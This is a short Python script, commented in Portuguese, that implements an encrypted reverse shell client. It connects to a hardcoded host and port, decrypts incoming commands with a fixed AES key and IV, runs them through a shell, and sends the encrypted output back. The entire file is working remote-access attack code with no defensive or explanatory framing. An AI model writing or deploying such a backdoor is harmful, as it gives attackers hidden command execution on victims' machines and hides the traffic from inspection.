from Crypto.Cipher import AES
from Crypto.Util import Padding
import socket
import subprocess
key = b"H" * 32  # chave secreta
IV = b"H" * 16 # 16 + 16 = 32 ,tamanho

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def cliente():
    s = socket.socket()
    s.connect(('192.168.0.1', 6666))
    while True:
        entrada = decrypt(s.recv(1024)) # descriptografar,1024 é a quantidade de carácter de retorno
        if 'sair' in entrada.decode():
             break
        else:
            CMD = subprocess.Popen(entrada.decode(), shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read())) #mensagem cifrada com segurança.